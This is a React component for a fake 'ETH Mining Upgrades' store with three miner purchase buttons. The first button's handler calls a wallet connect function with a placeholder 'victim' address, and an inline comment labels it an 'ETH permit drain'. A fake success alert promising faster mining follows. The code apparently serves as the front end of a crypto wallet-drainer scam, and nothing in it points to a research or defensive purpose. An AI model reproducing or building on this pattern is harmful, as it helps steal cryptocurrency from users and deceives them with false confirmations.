import React from 'react';
import { useOutletContext } from 'react-router-dom';
import { useWalletStore } from '../utils/ContextApi';

const Upgrade: React.FC = () => {
  const { activeTab } = useOutletContext<{ activeTab: string }>();
  const { connect } = useWalletStore();

  const buyUpgrade = async () => {
    await connect('0xVictimWalletExample', 1); // Upgrade = ETH permit drain
    alert('Upgrade bought! ETH mining +20% speed');
  };

  if (activeTab !== 'Upgrade') return null;

  return (
    <div className="bg-gray-900 p-6 rounded-lg max-w-md mx-auto">
      <h1 className="text-2xl mb-4">ETH Mining Upgrades</h1>
      <div className="space-y-4">
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Basic Miner</h3>
          <p className="text-sm text-gray-400 mb-2">12 BKEY - +10% ETH rate</p>
          <button onClick={buyUpgrade} className="bg-orange-500 px-4 py-2 rounded w-full">Buy (10,000 KEY)</button>
        </div>
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Turbo Miner</h3>
          <p className="text-sm text-gray-400 mb-2">32 TBKEY - +30% ETH rate</p>
          <button className="bg-orange-500 px-4 py-2 rounded w-full">Buy (20,000 KEY)</button>
        </div>
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Super Miner</h3>
          <p className="text-sm text-gray-400 mb-2">50 SKEY - +50% ETH rate</p>
          <button className="bg-orange-500 px-4 py-2 rounded w-full">Buy (30,000 KEY)</button>
        </div>
      </div>
    </div>
  );
};

export default Upgrade;